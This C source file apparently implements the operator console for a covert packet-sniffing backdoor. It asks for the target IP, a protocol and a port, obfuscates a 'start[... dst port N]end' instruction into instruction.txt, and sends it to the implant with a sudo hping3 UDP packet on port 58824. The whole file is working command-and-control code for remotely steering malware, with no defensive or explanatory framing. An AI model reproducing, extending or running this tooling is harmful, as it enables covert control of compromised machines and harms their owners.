#include "sniffer.h"


int main(int argc, char *argv[]) {
    struct options_sniffer opts;

    check_root_user();
    options_sniffer_init(&opts);
    while(1) {
        get_user_input(&opts);
        if (confirm_user_input(&opts) == 1) break;
    }
    //TODO: encrypt user input
    encrypt_and_create_instruction_file(&opts);
    send_instruction(&opts);

    return 0;
}


void options_sniffer_init(struct options_sniffer *opts) {
    memset(opts, 0, sizeof(struct options_sniffer));
}


void get_user_input(struct options_sniffer *opts) {
    get_ip_address(opts);   /* IP address for Hping */
    get_protocol(opts);     /* Instruction [ PROTOCOL ] */
    get_port(opts);         /* Instruction [ PORT ] */
}


void get_ip_address(struct options_sniffer *opts) {
    uint8_t input_length;

    while (1) {
        puts("\n[ SNIFFING IP ]");
        printf("Enter [ IP ] to packet-sniffing backdoors: ");
        fflush(stdout);
        fgets(opts->sniff_ip, sizeof(opts->sniff_ip), stdin);
        input_length = (uint8_t) strlen(opts->sniff_ip);
        if (input_length > 0 && opts->sniff_ip[input_length - 1] == '\n') {
            opts->sniff_ip[input_length - 1] = '\0';
            if (is_valid_ipaddress(opts->sniff_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


void get_protocol(struct options_sniffer *opts) {
    char input[3] = {0};
    uint8_t input_length = 0;

    while(1) {
        puts("\n[ SNIFFING PROTOCOL ]");
        puts("1. TCP");
        puts("2. UDP");
        printf("Select [ PROTOCOL ] to forward the backdoor instruction: ");
        fflush(stdout);

        fgets(input, sizeof(input), stdin);
        input_length = (uint8_t) strlen(input);
        input[input_length] = '\0';
        if (input_length == 2) {
            if (atoi(input) == 1) {
                strcpy(opts->sniff_protocol, "tcp");
                break;
            }
            else if (atoi(input) == 2) {
                strcpy(opts->sniff_protocol, "udp");
                break;
            }
            else {
                memset(input, 0, sizeof(input));
                puts("Port must 1 or 2");
            }
        }
    }
}


void get_port(struct options_sniffer *opts) {
    uint8_t input_length = 0;
    char port[8] = {0};

    while(1) {
        puts("\n[ SNIFFING PORT ]");
        printf("Enter [ PORT ] to forward the backdoor instruction: ");
        fflush(stdout);
        fgets(port, sizeof(port), stdin);
        input_length = (uint8_t) strlen(port);
        if (input_length > 0) {
            port[input_length] = '\0';
            if (is_valid_port(port)) {
                opts->sniff_port = (uint16_t) atoi(port);
                break;
            }
            else {
                memset(port, 0, sizeof(port));
                puts("Port must between 0 ~ 65535");
            }
        }
    }
}


bool confirm_user_input(struct options_sniffer *opts) {
    bool confirm = FALSE;
    uint8_t input_length = 0;
    char c[3] = {0};

    printf("\n=============== CONFIRM ===============\n");
    printf("[    IP    ] %s\n", opts->sniff_ip);
    printf("[ PROTOCOL ] %s\n", opts->sniff_protocol);
    printf("[   PORT   ] %d\n", opts->sniff_port);
    printf("=======================================\n");
    printf("Is this correct? [ Y / N ]: ");
    fflush(stdout);

    fgets(c, sizeof(c), stdin);
    input_length = (uint8_t) strlen(c);
    if (input_length > 0) {
        c[input_length -1] = '\0';
        if (strcmp(c, "Y") == 0 || strcmp(c, "y") == 0) confirm = TRUE;
    }
    return confirm;
}


bool is_valid_ipaddress(char *ip_address) {
    struct sockaddr_in sa;
    int result;

    result = inet_pton(AF_INET, ip_address, &(sa.sin_addr));
    return result;
}


bool is_valid_port(char *port) {
    int result = FALSE;

    if (atoi(port) >= 0 && atoi(port) < 65536) result = TRUE;
    return result;
}


void encrypt_and_create_instruction_file(struct options_sniffer *opts) {
    FILE *output;

    if((output = fopen("instruction.txt", "wb")) == NULL) {
        printf("Cannot open the file [ %s ] for writing\n", "instruction.txt");
        exit(1);
    }

    sprintf(opts->command, "start[%s dst port %d]end", opts->sniff_protocol, opts->sniff_port);
    for (int i = 0; i < strlen(opts->command); i++) {
        opts->encrypt_command[i] = encrypt_decrypt(opts->command[i]);
    }

    // write to file
    fprintf(output, "%s", opts->encrypt_command);
    fclose(output);
    sleep(1);
}


void send_instruction(struct options_sniffer *opts) {
    char hping3[64] = {0};
    int pid;

    pid = fork();
    if (pid == -1) {
        puts("fork() failed");
        exit(1);
    }
    else if (pid == 0) {
        sprintf(hping3, "sudo hping3 -c 1 -2 -E ./instruction.txt -d 100 -p 58824 %s", opts->sniff_ip);
        system(hping3);
    }
    else {
        wait(NULL);
    }
}
